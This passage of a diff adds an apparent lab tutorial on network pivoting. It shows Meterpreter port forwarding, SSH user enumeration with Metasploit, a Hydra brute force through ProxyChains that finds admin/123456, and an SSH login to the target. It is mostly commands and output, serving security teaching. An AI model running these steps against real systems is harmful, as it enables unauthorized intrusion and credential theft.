+    <span class="nf">-</span><span class="nb">p</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="no">Forward</span><span class="p">:</span> <span class="n">remote</span> <span class="n">port</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span><span class="o">.</span> <span class="no">Reverse</span><span class="p">:</span> <span class="n">remote</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="p">.</span>
+    <span class="nf">-</span><span class="n">r</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="no">Forward</span><span class="p">:</span> <span class="n">remote</span> <span class="n">host</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span><span class="p">.</span>
+
+
+<span class="nf">meterpreter</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>When we send a link request to our local 2323 port on our internet browser, this connection request will be forwarded to port 80 of the computer with IP address 7.7.7.20.</p>
+
+<p>Previously, it was determined that a web service was running on the <strong>80th TCP</strong> port of the <strong>7.7.7.20</strong>,thanks to ProxyChains and Nmap. In order to access this service, the port <strong>2323</strong> of the local system should be routed to port <strong>80</strong> of <strong>7.7.7.20</strong> which we want to access.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">portfwd</span> <span class="n">add</span> <span class="o">-</span><span class="no">L</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span> <span class="o">-</span><span class="n">l</span> <span class="mi">2323</span> <span class="o">-</span><span class="nb">p</span> <span class="mi">80</span> <span class="o">-</span><span class="n">r</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Local</span> <span class="no">TCP</span> <span class="n">relay</span> <span class="ss">created: </span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">2323</span> <span class="o">&lt;-&gt;</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">80</span>
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Active rules can be viewed with the <strong>portfwd list</strong> command.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">portfwd</span> <span class="n">list</span>
+
+<span class="no">Active</span> <span class="no">Port</span> <span class="no">Forwards</span>
+<span class="o">====================</span>
+
+   <span class="no">Index</span>  <span class="no">Local</span>             <span class="no">Remote</span>       <span class="no">Direction</span>
+   <span class="o">-----</span>  <span class="o">-----</span>             <span class="o">------</span>       <span class="o">---------</span>
+   <span class="mi">1</span>      <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">2323</span>  <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">80</span>  <span class="no">Forward</span>
+
+<span class="mi">1</span> <span class="n">total</span> <span class="n">active</span> <span class="n">port</span> <span class="n">forwards</span><span class="p">.</span>
+
+
+<span class="nf">meterpreter</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>When the application running on port 80 of the target system with IP address 7.7.7.20 is checked, it will be detected as <strong>Easy File Sharing Web Server</strong>.</p>
+
+<p><img src="/assets/images/blog/8.png" alt="" /></p>
+
+<h2 id="ssh-brute-force-over-pivoting">SSH Brute-Force over Pivoting</h2>
+
+<p>As you know, a SSH service was detected on 7.7.7.20. Performing a brute-force attack on this service is quite simple.</p>
+
+<p>The <strong>SSH_enumusers</strong> auxiliary module allows user detection:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_enumusers</span> 
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">ssh_enumusers</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">rhosts</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="n">rhosts</span> <span class="o">=&gt;</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">ssh_enumusers</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">rport</span> <span class="mi">22</span>
+<span class="n">rport</span> <span class="o">=&gt;</span> <span class="mi">22</span>
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">ssh_enumusers</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">user_file</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">metasploit</span><span class="o">/</span><span class="n">default_users_for_services_unhash</span><span class="p">.</span><span class="nf">txt</span>
+<span class="n">user_file</span> <span class="o">=&gt;</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">metasploit</span><span class="o">/</span><span class="n">default_users_for_services_unhash</span><span class="p">.</span><span class="nf">txt</span>
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">ssh_enumusers</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">Checking</span> <span class="k">for</span> <span class="kp">false</span> <span class="n">positives</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">Starting</span> <span class="nb">scan</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'admin'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'root'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'Administrator'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'sysadm'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'tech'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'operator'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'guest'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'security'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'debug'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'manager'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'service'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'!root'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'user'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'netman'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'super'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'diag'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'Cisco'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'Manager'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'DTA'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'apc'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'User'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'Admin'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'cablecom'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'adm'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'wradmin'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'netscreen'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'sa'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'setup'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'cmaker'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'enable'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'MICRO'</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span> <span class="o">-</span> <span class="no">SSH</span> <span class="o">-</span> <span class="no">User</span> <span class="s1">'login'</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Caught</span> <span class="n">interrupt</span> <span class="n">from</span> <span class="n">the</span> <span class="n">console</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Auxiliary</span> <span class="k">module</span> <span class="nn">execution</span> <span class="n">completed</span>
+<span class="o">^</span><span class="no">C</span>
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">ssh_enumusers</span><span class="p">)</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>In addition to the auxiliary modules on the Metasploit Framework for attack, Kali tools such as <strong>Hydra</strong> can also be used. By running Hydra in ProxyChains, all traffic will be routed to the target system through the compromised system.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@kali</span><span class="ss">:~</span><span class="c1"># proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4</span>
+<span class="no">ProxyChains</span><span class="o">-</span><span class="mf">3.1</span> <span class="p">(</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">proxychains</span><span class="p">.</span><span class="nf">sf</span><span class="p">.</span><span class="nf">net</span><span class="p">)</span>
+<span class="no">Hydra</span> <span class="n">v8</span><span class="o">.</span><span class="mi">2</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2016</span> <span class="n">by</span> <span class="n">van</span> <span class="no">Hauser</span><span class="o">/</span><span class="no">THC</span> <span class="o">-</span> <span class="no">Please</span> <span class="k">do</span> <span class="n">not</span> <span class="n">use</span> <span class="k">in</span> <span class="n">military</span> <span class="n">or</span> <span class="n">secret</span> <span class="n">service</span> <span class="n">organizations</span><span class="p">,</span> <span class="n">or</span> <span class="k">for</span> <span class="n">illegal</span> <span class="n">purposes</span><span class="o">.</span>
+
+<span class="no">Hydra</span> <span class="p">(</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">thc</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span> <span class="n">starting</span> 
+<span class="p">[</span><span class="no">WARNING</span><span class="p">]</span> <span class="no">Restorefile</span> <span class="p">(.</span><span class="nf">/</span><span class="n">hydra</span><span class="p">.</span><span class="nf">restore</span><span class="p">)</span> <span class="n">from</span> <span class="n">a</span> <span class="n">previous</span> <span class="n">session</span> <span class="n">found</span><span class="p">,</span> <span class="n">to</span> <span class="n">prevent</span> <span class="n">overwriting</span><span class="p">,</span> <span class="n">you</span> <span class="n">have</span> <span class="mi">10</span> <span class="n">seconds</span> <span class="n">to</span> <span class="nb">abort</span><span class="o">...</span>
+<span class="p">[</span><span class="no">DATA</span><span class="p">]</span> <span class="n">max</span> <span class="mi">4</span> <span class="n">tasks</span> <span class="n">per</span> <span class="mi">1</span> <span class="n">server</span><span class="p">,</span> <span class="n">overall</span> <span class="mi">64</span> <span class="n">tasks</span><span class="p">,</span> <span class="mi">20</span> <span class="n">login</span> <span class="n">tries</span> <span class="p">(</span><span class="n">l</span><span class="p">:</span><span class="mi">2</span><span class="o">/</span><span class="nb">p</span><span class="p">:</span><span class="mi">10</span><span class="p">),</span> <span class="o">~</span><span class="mi">0</span> <span class="n">tries</span> <span class="n">per</span> <span class="n">task</span>
+<span class="p">[</span><span class="no">DATA</span><span class="p">]</span> <span class="n">attacking</span> <span class="n">service</span> <span class="n">ssh</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span>
+<span class="o">|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="p">[</span><span class="mi">22</span><span class="p">][</span><span class="n">ssh</span><span class="p">]</span> <span class="ss">host: </span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>   <span class="ss">login: </span><span class="n">admin</span>   <span class="ss">password: </span><span class="mi">123456</span>
+<span class="o">|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="o">|</span><span class="no">S</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">target</span> <span class="n">successfully</span> <span class="n">completed</span><span class="p">,</span> <span class="mi">1</span> <span class="n">valid</span> <span class="n">password</span> <span class="n">found</span>
+<span class="no">Hydra</span> <span class="p">(</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">thc</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span> <span class="n">finished</span>
+<span class="n">root</span><span class="vi">@kali</span><span class="ss">:~</span><span class="c1">#</span>
+</code></pre></div></div>
+
+<p>SSH connection can be made to the target system via proxy server with <strong>admin</strong> username and <strong>123456</strong> password obtained from brute-force attack with Hydra.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@kali</span><span class="ss">:~</span><span class="c1"># proxychains ssh admin@7.7.7.20</span>
+<span class="no">ProxyChains</span><span class="o">-</span><span class="mf">3.1</span> <span class="p">(</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">proxychains</span><span class="p">.</span><span class="nf">sf</span><span class="p">.</span><span class="nf">net</span><span class="p">)</span>
+<span class="o">|</span><span class="no">D</span><span class="o">-</span><span class="n">chain</span><span class="o">|-&lt;&gt;-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="p">:</span><span class="mi">1080</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">22</span><span class="o">-&lt;&gt;&lt;&gt;-</span><span class="no">OK</span>
+<span class="no">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s1">'7.7.7.20 (7.7.7.20)'</span> <span class="n">can</span><span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '</span><span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="s1">' (ECDSA) to the list of known hosts.
+admin@7.7.7.20'</span><span class="n">s</span> <span class="ss">password: 
+
+
+
+</span><span class="n">bvshell</span><span class="ss">:/</span><span class="no">C</span><span class="o">/</span><span class="no">Documents</span> <span class="n">and</span> <span class="no">Settings</span><span class="o">/</span><span class="no">All</span> <span class="no">Users</span><span class="err">$</span> <span class="n">pwd</span>
+<span class="sr">/C/</span><span class="no">Documents</span> <span class="n">and</span> <span class="no">Settings</span><span class="o">/</span><span class="no">All</span> <span class="no">Users</span>
+<span class="n">bvshell</span><span class="ss">:/</span><span class="no">C</span><span class="o">/</span><span class="no">Documents</span> <span class="n">and</span> <span class="no">Settings</span><span class="o">/</span><span class="no">All</span> <span class="no">Users</span><span class="err">$</span> <span class="n">dir</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span>  <span class="mi">21</span><span class="p">:</span><span class="mi">32</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">Application</span> <span class="no">Data</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">25</span>  <span class="mo">06</span><span class="p">:</span><span class="mi">16</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">Desktop</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span>  <span class="mi">18</span><span class="p">:</span><span class="mi">36</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">Documents</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span>  <span class="mi">18</span><span class="p">:</span><span class="mi">37</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">DRM</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span>  <span class="mi">21</span><span class="p">:</span><span class="mi">32</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">Favorites</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span>  <span class="mi">18</span><span class="p">:</span><span class="mi">38</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">Start</span> <span class="no">Menu</span>
+<span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span>  <span class="mi">21</span><span class="p">:</span><span class="mi">32</span>          <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span> <span class="no">Templates</span>
+      <span class="mi">0</span> <span class="no">Files</span>                  <span class="mi">0</span> <span class="n">bytes</span>
+      <span class="mi">7</span> <span class="no">Directories</span>
+<span class="n">bvshell</span><span class="ss">:/</span><span class="no">C</span><span class="o">/</span><span class="no">Documents</span> <span class="n">and</span> <span class="no">Settings</span><span class="o">/</span><span class="no">All</span> <span class="no">Users</span><span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="gaining-access-to-the-second-pivot">Gaining Access to the Second Pivot</h2>
+
